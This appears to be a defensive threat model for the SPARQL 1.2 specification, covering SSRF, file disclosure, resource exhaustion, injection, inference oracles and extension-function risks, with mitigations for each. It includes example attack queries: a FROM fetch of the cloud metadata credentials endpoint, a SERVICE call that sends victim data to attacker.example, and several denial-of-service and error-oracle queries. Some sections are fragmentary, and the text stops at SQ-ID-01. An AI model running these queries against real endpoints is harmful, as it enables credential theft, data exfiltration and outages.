1Scope

1.1In scope

The query language as this document defines it: the concrete syntax and grammar (sparqlSyntax, grammar), the dataset-description constructs (specifyingDataset), the algebra and evaluation semantics (sparqlDefinition), the function library (SparqlOps), and the defined extension points (operatorExtensibility, extensionFunctions, sparqlBGPExtend).

1.3What a threat model for a query specification can say

This document defines meaning. It deliberately defines neither cost nor policy. The threats below therefore fall into three kinds, which call for different responses.

Kind 1 — the language creates it

Constructs that cause a conforming processor to take a security-relevant action: dereference an IRI, contact a remote service, execute third-party code. Properties of the language, warranting spec guidance.

Kind 2 — the cost model permits it

Constructs cheap to write and superlinear to evaluate. The spec cannot remove these without changing the language. It can make explicit that refusing them is conforming.

Kind 3 — the embedding creates it

Injection, access control, logging. Deployment properties — but the specification is where implementers look, so it should point at them.

1.4A structural finding

Verified by exhaustive search of the document: the only place this specification licenses a service to refuse a request is the dataset description.

"A query service may refuse a query request if the dataset description is not acceptable to the service."

— specifyingDataset

There is no statement anywhere in the document that a service may impose resource limits, bound recursion depth, cap result size, or abort an expensive query — and conformance speaks only to query strings, query results and the media type. Every availability mitigation in §3.B is therefore something an implementer must do without the spec saying it is allowed to. See R-1.

The same gap appears in the current security section, which is inherited largely unchanged from SPARQL 1.1: it covers dereference-driven indirection, file: URIs, extensions and IRI confusables, but says nothing about resource exhaustion, query injection, the absence of an access-control model, or SERVICE. privacy is TODO.

3.AOutbound requests — the service as a confused deputy

The language lets a query direct the service to fetch things. The service, not the client, makes those requests, with the service's network position (A4) and identity (A5). The highest-severity category for P4 and P5.

SQ-NET-01

SSRF via FROM / FROM NAMED

Risk
High
Where
P4 P5 · Medium at P1
Impact
High
Ease
High
Mechanism

specifyingDataset is explicit that these clauses specify the dataset by reference: they "indicate that the dataset should include graphs that are obtained from representations of the resources identified by the given IRIs". The IRIs are chosen by the query author. Nothing in the document restricts the scheme, the host, or the address.

SELECT * FROM <http://169.254.169.254/latest/meta-data/iam/security-credentials/>
WHERE { ?s ?p ?o }
Impact

Requests to addresses reachable only from the service: cloud instance-metadata endpoints (credential theft → A5), internal admin APIs, localhost management ports. Port and host scanning via differential timing and error behaviour, even when no content is returned. The current security section already names the shape of this — "The endpoint is potentially within an organisations firewall or DMZ, and so such queries may be a source of indirection attacks" — but does not name SSRF, the metadata endpoint, or redirect handling.

Mitigations
  • Do not dereference by default. Interpret FROM/FROM NAMED as selection from the local store. The spec permits this reading: the dataset description is "used in place of any dataset that the query service would use", and a service "may refuse a query request if the dataset description is not acceptable". Most mainstream engines already behave this way; it should be stated as the recommended default.
  • Where dereference is wanted, allowlist IRIs or hosts, and decide policy on the resolved IP address, not the IRI string (SQ-ID-02).
  • Deny loopback, link-local (169.254.0.0/16, fd00::/8), RFC 1918 and multicast ranges; re-check after every redirect, and refuse cross-scheme redirects.
  • Give the fetcher a distinct network identity and egress-proxy it; never let it inherit ambient cloud credentials.
  • Cap per-fetch bytes, time, and total fetches per query.
SQ-NET-02

Local file disclosure via file: and other schemes

Risk
High
Where
P3 P4
Impact
High
Ease
High
Mechanism

No scheme restriction exists in the language. security acknowledges the result: "the contents of file: URIs can in some cases be accessed, processed and returned as results, providing unintended access to local resources." Beyond file:, whatever schemes the implementation's URI handler supports are reachable — jar:, ftp:, gopher:, and in some stacks more.

Impact

Arbitrary file read as the engine's user: configuration, private keys, credentials, /proc contents. Two exfiltration channels — if the file parses as RDF its content appears in results directly; if it does not, parse-success versus parse-failure is a file-existence and partial-content oracle.

Mitigations

Scheme allowlist (http, https only, if any). Run the engine as an unprivileged user with no readable secrets. Treat "dereference disabled" as the default. Note that disabling file: alone is insufficient — http://localhost/ reaches a local server, and some URI stacks normalize unexpected schemes into file access.

SQ-NET-03

SSRF and bidirectional exfiltration via SERVICE, including variable endpoints

Risk
Critical
Where
P2 P4 P5
Impact
High
Ease
High
Mechanism

The semantics live in Federated Query, but the grammar is here:

ServiceGraphPattern ::= 'SERVICE' 'SILENT'? VarOrIri GroupGraphPattern

VarOrIri is the significant part: the endpoint may be a variable, bound at evaluation time — from VALUES, from BIND(IRI(CONCAT(...))), or from the data itself. The dereference target therefore need not appear anywhere in the query text, which defeats any control that allowlists IRIs by inspecting the query statically.

Impact — two directions, and the outbound one is the serious one

Inbound, as SQ-NET-01 but worse: the attacker controls not just the URL but a full request body.

Outbound exfiltration. A federated evaluation sends locally-held bindings to the remote endpoint as part of the remote request. That converts read access on a protected dataset into a data exfiltration channel that does not require the attacker to see the query results at all:

SELECT * WHERE {
  GRAPH <urn:tenant:victim> { ?s <http://ex/ssn> ?secret }
  SERVICE <https://attacker.example/collect> { ?s ?p ?secret }
}

This matters because many deployments reason about confidentiality purely in terms of what the client is shown. SERVICE breaks that: the data leaves via the service's own egress. SILENT then suppresses errors from the client's view, which is exactly what an attacker wants while iterating.

Amplification and reflection. The service becomes an attack proxy against third parties, with its own IP and reputation.

Mitigations
  • SERVICE disabled by default; enabled per-deployment with an explicit endpoint allowlist.
  • Enforce the allowlist at evaluation time, on the bound value, not on the query text. Rejecting SERVICE ?var outright is the simplest sound rule and is what most locked-down deployments want.
  • Never forward the service's own credentials to a federated endpoint; never let a variable-sourced endpoint inherit any credential.
  • Egress-proxy and log the resolved endpoints actually contacted — not the query text.
  • Log SILENT failures server-side even though they are hidden from the client.
  • Treat a value drawn from the dataset as never acceptable as an endpoint (SQ-INT-02).
SQ-NET-04

Base IRI ambiguity relocates the dereference target

Risk
Medium
Where
P3 P4
Impact
Medium
Ease
Medium
Mechanism

relIRIs specifies that, absent a BASE keyword, the base IRI may come from the encapsulating entity (RFC 3986 §5.1.2), from the retrieval URI of the query (§5.1.3), or from a default base (§5.1.4). The same query text therefore resolves relative IRIs — including those in FROM and SERVICE — differently in different deployments. Compounding it, the same section states that "Neither Syntax-Based Normalization nor Scheme-Based Normalization ... are performed".

Impact

A query reviewed and approved in one context dereferences something else in another. Allowlists keyed on IRI strings are bypassed by alternative spellings of the same target, and simultaneously block legitimate equivalent spellings.

Mitigations

Require absolute IRIs for dataset and service references; reject relative ones there. Pin the base explicitly. For policy decisions — never for term identity, which must stay strict per RDF semantics — apply full RFC 3986 §6 normalization and resolve to an address before deciding.

SQ-NET-05

Ingestion of attacker-controlled RDF

Risk
Medium
Where
P4 P5
Impact
Medium
Ease
Medium
Mechanism

Dereferenced representations are parsed and, for FROM, RDF-merged into the default graph (specifyingDataset). The remote server — not the query author, and not the service — controls the size and content of what arrives.

Impact

Decompression and size bombs; unbounded parse time; and, for the duration of the query, adversarial triples are inside the dataset, where they influence GRAPH ?g results and can be laundered through a CONSTRUCT into a downstream system that trusts the service's output.

Mitigations

Byte and time caps per fetch; enforce Content-Type rather than sniffing; no cross-scheme or cross-host redirect following; parse under a memory cap. Treat any graph obtained by dereference as untrusted for downstream purposes, and label it as such in provenance.

3.BAvailability — resource exhaustion

SPARQL query evaluation is computationally hard in the size of the query, and the language offers several independent routes to superlinear work. Evaluation of the full algebra is PSPACE-complete in combined complexity; nested OPTIONAL alone is NP-hard. A hundred-byte query can demand more work than the dataset has triples, several times over.

The governing gap

The language places no bound on anything: not query length, nesting depth, result cardinality, LIMIT/OFFSET magnitude, string length, or numeric magnitude. That is a legitimate choice for a semantics document, but combined with §1.4 it means implementers must build every defence here with no conformance cover. R-1 addresses that.

SQ-DOS-01

Join and cross-product explosion

Risk
High
Where
all profiles
Impact
High
Ease
High
Mechanism

Unconnected basic graph patterns form Cartesian products; UNION multiplies alternatives (alternatives); nested OPTIONAL (MultipleOptionals) is the NP-hard case. A query of k unconnected triple patterns has an intermediate result of size |G|k.

SELECT * WHERE { ?a ?b ?c . ?d ?e ?f . ?g ?h ?i . ?j ?k ?l }
Mitigations

Bound intermediate cardinality, not just final result size — this is the one that matters, because LIMIT does not help (see SQ-DOS-03). Estimate cost before evaluating and refuse above a threshold. Cap the number of triple patterns and the join graph's disconnected-component count. Hard wall-clock and memory limits per query, enforced by the executor rather than cooperatively.

SQ-DOS-02

Property path explosion

Risk
High
Where
all profiles
Impact
High
Ease
High
Mechanism

propertypath-arbitrary-length guarantees termination and no duplicates — "Connectivity matching is defined so that matching cycles does not lead to undefined or infinite results" — but says nothing about cost, which is unbounded. Evaluation is defined by recursive traversal (ALP / reachableTerms, PropertyPathPatterns).

SELECT * WHERE { ?s (!<urn:x>)* ?o }         # closure over every predicate, both ends free
SELECT * WHERE { ?s ((:p|:q)/(:r|:s))* ?o }  # alternation nested inside closure

With both endpoints unbound, * and + force computation of a transitive closure over the whole graph — quadratic in the node count in the worst case — and the negated property set ! forces a full predicate scan. Nesting multiplies.

Mitigations

A step budget inside ALP, checked per expansion and aborting the query rather than silently truncating — silent truncation returns wrong answers, which is worse. Cap closure-expression nesting depth. Require at least one bound endpoint for unbounded paths in hardened profiles. Convert recursion to an explicit worklist so traversal depth does not consume the call stack (SQ-DOS-06).

SQ-DOS-03

Sort, grouping and aggregation memory

Risk
High
Where
all profiles
Impact
High
Ease
High
Mechanism

ORDER BY requires the whole solution sequence to be materialized before ordering, and the algebra applies Slice after OrderBy (convertSolMod, sparqlOffsetLimit) — so LIMIT 1 does not bound the work of an ORDER BY query. GROUP BY on a computed or high-cardinality key creates one group per solution. DISTINCT over a wide projection requires a set of all solutions. GROUP_CONCAT (aggGroupConcat) builds one unbounded string per group, and a naive implementation builds it quadratically.

SELECT (GROUP_CONCAT(?o) AS ?all) WHERE { ?s ?p ?o }                  # one string, whole dataset
SELECT ?k (COUNT(*) AS ?c) WHERE { ?s ?p ?o } GROUP BY (RAND() AS ?k)  # one group per solution
Mitigations

Spill to disk with a disk budget, or refuse. Cap group count, per-group accumulator size, and GROUP_CONCAT result length. Note explicitly in operator documentation that LIMIT is not a cost bound.

SQ-DOS-04

String and numeric amplification

Risk
Medium–High
Where
P3 · Medium elsewhere
Impact
High
Ease
Medium
Mechanism — strings

CONCAT of a value with itself, chained through subqueries or successive BINDs, doubles length per step: linear query text, exponential memory.

SELECT ?x30 WHERE {
  BIND("payload" AS ?x0) BIND(CONCAT(?x0,?x0) AS ?x1) BIND(CONCAT(?x1,?x1) AS ?x2)
  # ... 30 steps -> ~1 GB from one short query
}
Mechanism — numerics

The grammar is unbounded, with no digit limit:

INTEGER      ::= [0-9]+
EXPONENT     ::= [eE] [+-]? [0-9]+
LimitClause  ::= 'LIMIT' INTEGER
OffsetClause ::= 'OFFSET' INTEGER

xsd:integer and xsd:decimal are arbitrary-precision in XSD 1.1. A literal with ten million digits is syntactically valid and must be parsed; repeated multiplication of large integers is a CPU and memory sink. OFFSET 99999999999999999999 is legal, and is both a deep-scan request and an integer-overflow test case for the implementation.

Mitigations

Cap literal length at parse time and intermediate string length at evaluation time, as hard errors. Cap digit count for numeric literals and bit-length for arbitrary-precision results. Clamp or reject LIMIT/OFFSET above a configured maximum; use a width that cannot overflow, and test the boundary.

SQ-DOS-05

Regular-expression denial of service

Risk
High
Where
all profiles
Impact
High
Ease
High
Mechanism

func-regex and func-replace delegate to XPath fn:matches and fn:replace. The XSD regex language includes constructs — nested quantification, and back-references in the XPath 3.1 flavour — that make a backtracking engine exponential in the subject length. Both the pattern and the subject are expressions, so either may be a variable, and therefore may come from the data or from an untrusted application parameter.

SELECT * WHERE { ?s ?p ?o FILTER(REGEX(?o, "^(a+)+$")) }

One FILTER evaluated over many rows is an extremely cheap CPU bomb, and the per-row cost multiplies the per-match cost.

Mitigations

Use a non-backtracking matcher (Thompson NFA / RE2-style) with linear-time guarantees — the only robust fix. Note the genuine tension worth flagging to the WG: back-references are not expressible in such engines, so a linear-time implementation may be unable to support the full fn:matches language. Failing that: per-call timeouts, pattern-length and nesting caps, compiled-pattern caching keyed on the pattern, and refusal of data-sourced patterns.

SQ-DOS-06

Parser and evaluator stack exhaustion from unbounded nesting

Risk
High
Where
all profiles
Impact
Medium–High
Ease
High
Mechanism

The grammar is recursive with no depth bound, and sparqlGrammar notes it "is LL(1) when the rules with uppercase names are used as terminals" — which makes recursive descent the natural implementation, and recursive descent on unbounded nesting exhausts the call stack. Nesting is available at many points: GroupGraphPattern, subqueries, parenthesised expressions, RDF collections, and — newly in 1.2 — nested triple patterns and annotation blocks. The 1.2 change list records that UnaryExpression was amended to allow !!, so repeated ! is now explicitly legal.

ASK { FILTER(!!!!!!!!!! ... !!!!true) }      # one line, thousands of operators
ASK { { { { { { ... } } } } } }
ASK { ?s ?p <<( <<( <<( ... )>> )>> )>> }    # 1.2: deep triple-term nesting

Deeply nested triple terms then force recursive work after parsing too: in TRIPLE/SUBJECT/PREDICATE/OBJECT (func-triple-terms), in term comparison and ordering (which modOrderBy now extends to triple terms), and in hashing and indexing.

Mitigations

An explicit configured depth limit, returning a syntax error. Apply it in the parser and in every recursive walk over terms and algebra — comparison, ordering, hashing, serialization and CONSTRUCT instantiation are each a separate recursion. Prefer an explicit stack to native recursion in the term walkers. A guard-page fallback is not sufficient alone, since stack exhaustion in a shared process may be unrecoverable.

SQ-DOS-07

Syntactic-sugar expansion defeats input-size limits

Risk
Medium
Where
all profiles · new in 1.2
Impact
Medium
Ease
Medium
Mechanism

Several constructs expand during translation (sparqlExpandForms). syntaxReifyingTriples expands << s p o >> :q ?v into an rdf:reifies triple plus the annotation triples, allocating "a fresh blank node that is not used anywhere else in the query". syntaxAnnotation expands an annotation block into the asserted triple plus one reifying triple plus one triple per annotation, with a fresh blank node per block. RDF collections (collections) expand into rdf:first/rdf:rest chains. Predicate-object and object lists multiply.

Expansion is multiplicative when nested, so the post-expansion algebra can be far larger than the source text.

Impact

Any limit applied to the byte count of the received query is the wrong limit. This is a new and sharper concern in 1.2, because reification and annotation syntax are compact on the surface and expansive underneath.

Mitigations

Apply size and depth limits to the post-expansion AST or algebra, not to the request body. Keep a request-body limit as well, but treat it as a coarse outer bound only.

SQ-DOS-08

Correlated EXISTS / NOT EXISTS / MINUS cost

Risk
Medium–High
Where
P1 P4
Impact
High
Ease
Medium
Mechanism

neg-exists now gives EXISTS a formal definition in which the inner pattern is evaluated with respect to a solution mapping μ — the 1.2 change list records eval being extended with "a solution mapping μctx as a third argument". Semantically this is a clarification and an improvement. Operationally, read literally it is one inner evaluation per outer solution: N × cost(inner). The inner pattern may itself contain a property path or another EXISTS, so nesting multiplies.

Impact

A correct implementation is not automatically a bounded-cost one. A short query with two levels of EXISTS over a moderate dataset can be effectively unbounded.

Mitigations

Cap EXISTS nesting depth. Account inner evaluations against the query's overall budget rather than treating each as fresh. Where an optimizing rewrite is used, ensure it preserves semantics. Short-circuit on first match, which the definition's "is not empty" permits.

SQ-DOS-09

Amplification asymmetry summary

Risk
cross-cutting
Where
names the shape the SQ-DOS entries share

The threats above share a shape worth naming for deployers: request cost is negligible, evaluation cost is unbounded, and the ratio is attacker-chosen. That is what makes an open endpoint a standing availability target, and what makes rate limiting by request count ineffective — the budget must be in work units (time, memory, intermediate cardinality), not requests. With SERVICE and FROM it also makes the service an amplifier against third parties and against itself.

3.CInjection and parsing integrity

The threats here live partly in the application and partly in the gap between two parsers. Both are properties the specification shapes, and the specification is where developers look for them.

SQ-INJ-01

Query injection via string construction

Risk
High
Where
P2 P3 P4 · any app fronting an endpoint
Impact
High
Ease
High
Mechanism

The threat lives in the application (TB0), but the available vectors are properties of this grammar.

VectorGrammar basisPayload shape

Trailing backslash'\\' escape, sec-escapesinput ending \ consumes the app's own closing quote

Impact

Mitigations, in order of preference
  1. Do not build query text by concatenation. Use a parameterized API that substitutes RDF terms into a pre-parsed query or algebra — VALUES or BIND of terms, not text.
  2. If text must be built, escape with a library implementing sec-escapes exactly — and validate IRIs after resolution, not before.
  3. Separate read-only and read-write endpoints with separate credentials; parse read endpoints at the QueryUnit entry point only.
  4. Validate structurally, on the parsed form, not with text patterns or denylists.
SQ-INJ-02

Grammar-entry-point confusion (read → write escalation)

Risk
Medium
Where
all profiles
Impact
High
Ease
Low–Medium
Mechanism

grammar: "The SPARQL grammar covers both SPARQL Query and SPARQL Update", with "two entry points into the grammar: QueryUnit for the SPARQL query language, UpdateUnit for the SPARQL update language." A deployment that selects the entry point by sniffing the content rather than by the protocol operation and endpoint can be steered. Update additionally allows ;-separated operation sequences — the structural analogue of stacked SQL statements.

Mitigations

Select the entry point from the protocol operation and the endpoint, never from the content. Reject anything that does not parse at the expected entry point. Enforce read-only at the storage layer too, so a mis-dispatch cannot write.

SQ-INJ-03

Parser differentials desynchronize security controls

Risk
Medium–High
Where
any deployment with a query-inspecting gatekeeper
Impact
High
Ease
Medium
Mechanism

Any control that inspects a query — a WAF, a rewriter, a cost estimator, an ACL enforcer, an audit logger — depends on its parse agreeing with the engine's. This grammar offers several ways for two parsers to disagree.

  • Escape processing. 1.1-era implementations processed escapes before parsing; 1.2 processes them during parsing. The two assign different meanings to the same string (SQ-INJ-04).
  • Longest-match tokenization. sparqlGrammar: "When tokenizing the input and choosing grammar rules, the longest match is chosen." whitespace gives the consequence concretely: 
    ?a<?b&&?c>?d
    is "the token sequence variable ?a, an IRI <?b&&?c>, and variable ?d, not an expression involving the operator &&". A gatekeeper that lexes differently is looking at a different query.
  • No IRI normalization, and %-sequences left undecoded (sec-escapes: "These sequences are not decoded during processing").
  • Case-insensitive keywords, except a.
  • Error-case extensibility (extensionFunctions, see SQ-EXT-01), so "this expression errors" is not portable.
Mitigations

Enforce policy on the translated algebra, inside the engine, after translation — never on the text. Use one parser for both the control and the engine. Never re-serialize and re-parse a query between the control and the engine. Log the algebra actually executed and the dereference targets actually contacted, not the received text.

The 1.2 change list records: "Change escape sequence processing to be processed during parsing, not before. This aligns SPARQL with escape sequences in Turtle." sec-escapes now specifies single-pass, left-to-right processing with no rescanning of substituted output, and gives a worked table:

Why this matters for security

Under the 1.1 pre-parse model, \u0022 in an interpolated value could become a real " and terminate a literal — an injection that succeeded even when the application escaped quotes correctly. The 1.2 model closes that class, along with the \-smuggling variant where a decoded backslash combines with the following character to form a new escape. Separately, numeric escapes now "MUST NOT produce a code point value in the range U+D800 to U+DFFF", closing the lone-surrogate / ill-formed-UTF-8 smuggling class in which components disagree about a string's identity.

Consequences

This belongs in security as an explicit note, for two reasons: it is a real hardening with an unhappy history in other languages, and an implementation still carrying 1.1-era pre-pass code is now both non-conforming and vulnerable. It is also a parser-differential source during the migration window (SQ-INJ-03).

SQ-INJ-05

VERSION is a client assertion, not a guarantee

Risk
Low–Medium

Impact
Low–Medium

Mechanism

syntaxVersionAnnouncement: authors "MAY announce" the version, and "Processors may treat unrecognized labels as an error or as a warning." The protocol's version media-type parameter "is considered if there is no VERSION directive". Nothing requires the declaration to be true of the query's content: a query may use triple terms while declaring "1.2-basic", or omit the directive entirely.

Impact

Fingerprinting — probing which labels are accepted cheaply reveals engine version and feature set, and the "error or warning" latitude makes behaviour a distinguisher. And a gatekeeper that gates features on the declared version is trusting client-supplied metadata.

Mitigations

Gate on what the parse actually contains, never on the declaration. Treat unknown labels consistently (prefer error). Keep error text uniform across versions.

3.DConfidentiality and inference

The largest category, as expected for a query language. It rests on one structural fact, stated first.

SQ-CONF-01

The language defines no access-control model

Risk
Critical
Where
P2 · High at P4 P5 · the premise of this category
Mechanism

Nothing in the document defines authorization, per-graph permissions, or triple-level security. The dataset is a flat structure (rdfDataset), and GRAPH ?g ranges over all named graphs in the active dataset (queryDataset): the keyword may "use a variable which will range over the IRI of all the named graphs in the query's RDF dataset." A "the client only queries the default graph" assumption is not enforced by anything in the language.

Worse, specifyingDataset lets the query redefine the dataset: "If a query provides such a dataset description, then it is used in place of any dataset that the query service would use if no dataset description is provided in a query."

The hook

"The RDF dataset may also be specified in a SPARQL protocol request, in which case the protocol description overrides any description in the query itself."

— specifyingDataset
Mitigation — the single most important one in this document

Where dataset choice is a security boundary: set the dataset in the protocol request, and refuse queries that carry their own dataset description. Both halves are explicitly permitted — the protocol override, and "A query service may refuse a query request if the dataset description is not acceptable to the service."

Beyond that: the active dataset should contain exactly what the requester is permitted to see. Authorize by constructing the dataset, not by filtering results — the diagram below shows why the alternative fails.

SQ-CONF-02

Metadata enumeration

Risk
Medium–High
Where
P2
Impact
Medium
Ease
High
Mechanism

Two one-line queries. Graph names, via accessByIdentifier together with the empty group pattern (emptyGroupPattern, which matches once per graph):

SELECT DISTINCT ?g WHERE { GRAPH ?g {} }
SELECT DISTINCT ?p WHERE { ?s ?p ?o }
Impact

Asset A2. Graph IRIs in practice encode tenant identifiers, customer names, case numbers, dates, source-system names and ingest batch ids — so enumerating names leaks the shape of the business even when every triple is protected. Predicate enumeration recovers the schema, which is the prerequisite for every targeted attack that follows.

Mitigations

Restrict the active dataset per requester so unauthorized names are not present (SQ-CONF-01). Do not encode sensitive information in graph IRIs — use opaque names with the sensitive mapping held separately. Treat graph-name enumeration as a privileged operation.

SQ-CONF-03

Inference oracles: result-level filtering is not confidentiality

Risk
High
Where
P2 P4
Impact
High
Ease
Medium
Mechanism

When an authorization layer filters results while evaluation still touches protected data, the language provides several channels that reveal what was filtered. See the diagram in SQ-CONF-01.

Error channel

An error in a FILTER removes the solution (expressions: FILTERs "eliminate any solutions that ... either result in an effective boolean value of false or produce an error"), and errors propagate outward (sparql-error: "If the evaluation of an expression raises an error, then the evaluation of every function, operator, and expression that contains the expression with the error also raises an error"). So row presence encodes an arbitrary predicate over hidden values:

ASK { ?s <http://ex/salary> ?v FILTER(1/(?v - 100000) > 0) }   # errors iff ?v = 100000

One bit per query, which is enough for binary search over a hidden value. The same trick works with xsd:integer("...") constructor errors, out-of-range SUBSTR and datatype casts.

Timing channel

The functional forms &&, ||, IF and COALESCE have special evaluation rules (expressions, func-forms) — short-circuiting is exactly what makes conditional cost observable. FILTER(?secret = "a" && <expensive path>) reveals the comparison's outcome in the response time regardless of what is returned. invocation adds that "The order of argument evaluation is not defined", so this is implementation-variable but rarely absent.

Existence channel

NOT EXISTS and MINUS (negation) test a pattern's presence without projecting any of its variables — a query can answer a question about data the requester may not read. ASK (ask) is the limit case: no data returned, one bit about the entire dataset.

Cardinality channel

COUNT over data that is filtered only on the way out.

Mitigations

Authorize by restricting the data, before evaluation — dataset selection or pattern rewriting — so protected triples never enter the evaluation at all. If post-filtering is unavoidable, accept that it is a leak-rate reduction and not a confidentiality control: normalize error reporting, add per-identity rate limits and anomaly detection on query volume and shape, and log for after-the-fact detection. Timing mitigation in a query engine is impractical, which is itself an argument for the dataset-restriction approach.

SQ-CONF-04

DESCRIBE is unbounded, implementation-defined disclosure

Risk
Medium–High
Where
P2 P4
Impact
High
Ease
High
Mechanism

describe is marked Informative, and leaves the content entirely open: "The description is determined by the query service", "The RDF returned is determined by the information publisher", and "It may include information about other resources". DESCRIBE * "describes all of the variables in a query", and for multiple solutions "the RDF data for each is the union of all RDF graph descriptions".

Impact

Three distinct problems. (a) If implemented as a blank-node closure or neighbourhood walk — which the spec's own example illustrates, returning a nested vcard:N structure — the walk can traverse from an authorized resource into unauthorized data, and it is not expressed as a pattern an ACL layer can inspect or rewrite. (b) Result size is unbounded and attacker-influenced. (c) Being informative and implementation-defined, its behaviour is unpredictable across engines, so no portable reasoning about what it discloses is possible.

Mitigations

Disable DESCRIBE in access-controlled deployments, or implement it as an explicit, inspectable, ACL-respecting pattern with a hard size cap. Do not implement it as "walk the store outward from this node." Document the chosen description algorithm so deployers can reason about it.

SQ-CONF-05

Blank node labels as a leak and a correlation handle

Risk
Medium
Where
P2 P4
Impact
Medium
Ease
Low
Mechanism

The spec gives implementations full latitude here, and that latitude is also the licence to randomize. BlankNodesInResults: labels "are scoped to a result set ... or, for the CONSTRUCT query form, the result graph"; "the blank node identifiers in the results only indicate whether RDF terms in the solutions are the same or different"; and "There need not be any relation between a blank node identifier _:a in the result set and a blank node identifier used in the syntax for the data." grammarBNodes adds that "Fresh blank nodes are generated for each request; blank nodes cannot be referenced by identifier across requests."

Impact

The threat is implementations that emit internal identifiers instead: row ids, primary keys, storage node ids, memory addresses, or a monotonic counter. These leak internal structure — store size, insertion order, whether two results came from the same internal record — and if stable across queries they become a correlation handle for records the requester cannot otherwise read, which is precisely what the scoping rule is meant to prevent. A related hazard: BNODE(str) (func-bnode) and CONSTRUCT templates (templatesWithBNodes) mint labels from solution data, so a label derived by unsalted hashing of its input is an offline guessing oracle for that input.

Mitigations

Emit opaque labels generated per result set, randomized or salted per result set. Never derive a label from a storage identifier, and never derive one deterministically from solution content. This deserves a note in security — the scoping rules make it permitted, but nothing currently makes it advised.

SQ-CONF-06

Hash functions: a guessing oracle, and two broken algorithms in the standard library

Risk
Medium–High
Where
P2 P4
Impact
Medium–High
Ease
High
Mechanism

func-hash provides MD5, SHA1, SHA256, SHA384 and SHA512 over a literal's lexical form. Three distinct problems follow.

  1. In-engine bulk guessing. The attacker supplies candidates and the engine tests them against data it can read but the attacker cannot: VALUES ?guess { ... } joined with FILTER(SHA256(?secret) = SHA256(?guess)) turns one query into as many guesses as the engine will evaluate. Confirmation requires only a one-bit answer, so ASK suffices.
  2. Offline cracking of returned digests. A hash of a low-entropy value — email, phone number, national id, postcode — is reversible by enumeration. The spec's own DESCRIBE example contains foaf:mbox_sha1sum "bee135d3af1e418104bc42904596fe148e90f033", which is exactly this pattern: an unsalted SHA-1 of an email address, widely used in the FOAF ecosystem as a pseudonym, and trivially reversible.
  3. Broken primitives presented without qualification. MD5 and SHA-1 are not collision-resistant. The spec defines them neutrally — correctly, since they are also used for non-security checksums — but offers no caution, and deployments do reach for them.
Mitigations

Treat an unsalted hash of a low-entropy identifier as not de-identification — this belongs in privacy, since it is the most common anonymization mistake in RDF data publishing. Document MD5 and SHA-1 as legacy and unsuitable for security purposes. Do not expose hash functions over values the requester cannot read.

SQ-CONF-07

Query text is itself sensitive data

Risk
Medium
Where
all profiles · High at P5
Impact
Medium
Ease
High (passive)
Mechanism

Queries carry the selector: the email, account number, patient id or coordinates being looked up — typically as a literal in a FILTER or VALUES. The media type (mediaType) is a POST body, but query-in-URL via GET is common in practice.

Impact

Query text accumulates in server access logs, proxy logs, URLs, browser history, Referer headers, error messages, bug reports and shared "try this query" links — none of which are usually classified at the sensitivity of the data they encode. Separately, FROM and SERVICE disclose to third parties which graphs a user is interested in, revealing the user's interest to a party that was never meant to learn it.

Mitigations

A privacy item. Prefer POST for queries carrying identifiers; treat query logs at the data's classification; redact literals in logs where feasible while keeping the structure for debugging; set retention. Note the third-party disclosure inherent in dereference.

SQ-CONF-08

Linkage, re-identification and aggregate differencing

Risk
Medium–High
Where
P2 P4 P5
Impact
High
Ease
Medium
Mechanism

Joining across graphs is SPARQL's core competence, and with SERVICE it joins across administrative domains in one line. That is also the textbook re-identification mechanism: combining individually innocuous datasets to single out a person. Independently, aggregates (aggregates) permit differencing — compute COUNT with and without one condition and recover an individual fact — so "we only expose aggregates" is not anonymity.

Impact

Re-identification from permitted queries over permitted data, with no access-control violation anywhere. And federated evaluation moves personal data across jurisdictional boundaries as a side effect of query evaluation, which is a data-transfer compliance question, not only a security one.

Mitigations

A privacy item, and largely a governance one: query logging and review, minimum group sizes for aggregate release, suppression of small cells, and awareness that aggregate-only exposure is not a privacy control. For federation, control which endpoints may be contacted (SQ-NET-03) and record cross-domain flows.

3.EExtensibility

Two defined extension points, each of which moves part of the evaluation outside what this specification constrains.

SQ-EXT-01

Extension functions are arbitrary code in the evaluation path, named by the query

Risk
High where enabled
Where
all profiles
Impact
Critical
Ease
depends on registration
Mechanism

extensionFunctions: a PrimaryExpression may be "a call to an extension function named by an IRI", whose semantics "are identified by the IRI that identifies the function". operatorExtensibility permits added operator mappings. The only constraint the spec imposes is monotonicity: "No additional operator may yield a result that replaces any result other than an error", so that FILTER results remain a superset of the unextended ones. Nothing is said about side effects, resource consumption, filesystem access, or network access.

extensionFunctions goes further and licenses behavioural divergence precisely where it is most security-relevant:

"any function or operator that is specified to return an error under some conditions is a valid extension point. That is, an implementation may return a non-error value in these error cases, and still be conformant with this recommendation."

— extensionFunctions
Impact

An extension function runs with the engine's privileges: it can read files (A6), make network requests with the engine's identity (A5, A4 — an SSRF and exfiltration path entirely outside FROM/SERVICE controls), consume unbounded resources, or crash the process. The escalation to remote code execution is an engine that resolves unknown function IRIs dynamically — plugin-lookup-by-IRI, classpath scanning, or, worst, dereferencing the function IRI to fetch code. Because the query names the function, dynamic resolution hands the attacker the choice of what runs.

Separately, the error-case latitude means no security control can portably rely on "this expression errors" — which undercuts both SQ-CONF-03's reasoning and SQ-INJ-03's gatekeepers.

Mitigations

An explicit static registry; never resolve a function IRI dynamically; never dereference a function IRI. Treat registration as a privileged deployment-time action, not a runtime one. Apply the engine's resource caps and sandbox to extension code, and account its work against the query budget. Require each extension to document its own security considerations — the current security sentence, "The SPARQL language permits extensions, which will have their own security implications", is correct but does not ask anything of anyone.

SQ-EXT-02

Entailment regimes: unbounded cost, and inference around triple-level ACLs

Risk
Medium where enabled
Where
all profiles
Impact
Medium–High
Ease
Medium
Mechanism

sparqlBGPExtend permits BGP matching to be redefined by an entailment regime. Its obligations are weak by design: regimes "should provide conditions to prevent trivial infinite solution multisets as appropriate to the regime", and "The effect of a query on an inconsistent graph is not covered by this specification, but must be specified by the particular SPARQL extension."

Impact

(a) Reasoning cost ranges from expensive to undecidable, and the spec's safeguard is a should about trivial infinite results only — an availability threat with no spec-level bound. (b) Inconsistent graphs have unspecified behaviour, an availability and correctness hazard an attacker can trigger by writing two conflicting triples (the spec's own example: _:x rdf:type xsd:string with _:x rdf:type xsd:decimal). (c) For access control, the serious one: entailment derives facts that were never stored as triples, so a per-triple permission model silently fails to cover inferred triples — data can be concluded that no permission check ever saw.

Mitigations

Bound reasoning work and depth. Decide authorization over the entailed view, not the asserted one — or do not combine entailment with triple-level ACLs. Define behaviour on inconsistent input rather than leaving it to chance.

3.FIdentity and naming confusion

Spoofing of names rather than principals — the language has no principal concept, per SQ-CONF-01.

SQ-ID-01

